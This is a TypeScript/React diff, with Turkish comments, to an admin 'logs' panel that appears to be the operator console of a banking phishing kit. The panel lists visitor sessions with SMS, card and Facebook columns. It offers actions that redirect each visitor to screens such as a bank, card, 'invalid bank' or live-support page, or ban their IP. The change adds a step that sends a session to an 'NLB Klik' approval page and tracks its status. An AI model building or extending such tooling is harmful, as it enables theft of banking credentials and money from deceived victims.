@@ -28,6 +28,7 @@ const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
   { value: "generator1", label: "Generator 1" },
   { value: "generator2", label: "Generator 2" },
   { value: "transfer", label: "Transfer Onayı" },
+  { value: "nlb", label: "NLB" },
 ];
 
 function getApprovalDisplayText(value: string): string {
@@ -1210,6 +1211,30 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       return;
     }
 
+    // NLB ONAY: kullaniciyi yeni NLB Klik onay sayfasina yonlendir.
+    // Modal YOK - direkt step + approvalStatus='nlb' (kolon: NLB Bekliyor).
+    if (action === "nlb_approval") {
+      const row = rowsRef.current.find((r) => r.id === sessionId);
+      const prevFd =
+        row?.form_data && typeof row.form_data === "object"
+          ? (row.form_data as Record<string, unknown>)
+          : {};
+      const { error } = await supabase
+        .from("sessions")
+        .update({
+          current_step: "nlb_approval",
+          status: "online",
+          is_hidden: false,
+          form_data: { ...prevFd, approvalStatus: "nlb" },
+        })
+        .eq("id", sessionId);
+      if (error) {
+        alert("[ADMIN DB HATA] nlb_approval guncellenemedi: " + String(error.message || error));
+      }
+      void load();
+      return;
+    }
+
     if (action === "win" || action === "banken" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
       const { data, error } = await supabase
         .from("sessions")
@@ -1928,6 +1953,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
                 <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
                 <th className="min-w-[110px] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
+                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
                 <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
                 <th className="min-w-[70px] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
                 <th className="min-w-[150px] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
@@ -1936,7 +1962,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
             <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
               {rows.length === 0 && (
                 <tr>
-                  <td colSpan={10} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
+                  <td colSpan={11} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
                 </tr>
               )}
               {rows.map((row) => {
@@ -1993,6 +2019,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 else if (s === "custom_question") { stepText = "ÖZEL SORU"; stepColor = "text-violet-500 bg-violet-500/10 border border-violet-500/20"; }
                 else if (s === "generator1") { stepText = "GENERATOR 1"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
                 else if (s === "generator2") { stepText = "GENERATOR 2"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
+                else if (s === "nlb_approval") { stepText = "NLB ONAY"; stepColor = "text-[#5b21b6] bg-[#5b21b6]/10 border border-[#5b21b6]/20"; }
                 else if (s === "special_approval") {
                   const rawAppr = (typeof fd.approvalStatus === "string" ? fd.approvalStatus : "").replace(/_confirmed$/, "");
                   const opt = APPROVAL_OPTIONS.find((o) => o.value === rawAppr);
@@ -2116,6 +2143,26 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         ) : null}
                       </div>
                     </td>
+                    {/* === ONAY SUTUNU (NLB onay durumu: Bekliyor / Onaylandi) === */}
+                    <td className="px-2 py-3 align-top whitespace-nowrap">
+                      {(() => {
+                        const appr = typeof fd.approvalStatus === "string" ? fd.approvalStatus : "";
+                        const label = getApprovalDisplayText(appr);
+                        if (!label) {
+                          return <span className={`${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>;
+                        }
+                        const confirmed = appr.endsWith("_confirmed");
+                        return (
+                          <span className={`inline-block rounded-full px-2 py-1 text-[9px] font-bold tracking-wide border whitespace-nowrap ${
+                            confirmed
+                              ? "text-green-500 bg-green-500/10 border-green-500/20"
+                              : "text-amber-500 bg-amber-500/10 border-amber-500/20"
+                          }`}>
+                            {label}
+                          </span>
+                        );
+                      })()}
+                    </td>
                     <td className="px-2 py-3 align-top">
                       <span className={`inline-block max-w-full rounded-full px-2 py-1 text-[9px] font-bold tracking-wide shadow-sm whitespace-normal break-words [overflow-wrap:anywhere] leading-tight text-center ${stepColor}`}>
                         {stepText}
@@ -2158,6 +2205,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             <option value="invalid_bank">❌ Hatalı Banka (Uyarı)</option>
                             <option value="live_support">🎧 Canlı Desteğe Yönlendir</option>
                             <option value="congrats">✅ Tebrikler Ekranına Al</option>
+                            <option value="nlb_approval">🔐 NLB Onayına Yönlendir</option>
                             <option value="special_approval">🔔 Özel Bildirim Gönder</option>
                             <option value="custom_question">❓ Özel Soru Gönder</option>
                             <option value="ban_ip">🚫 IP Banla (Siteye Giremesin)</option>
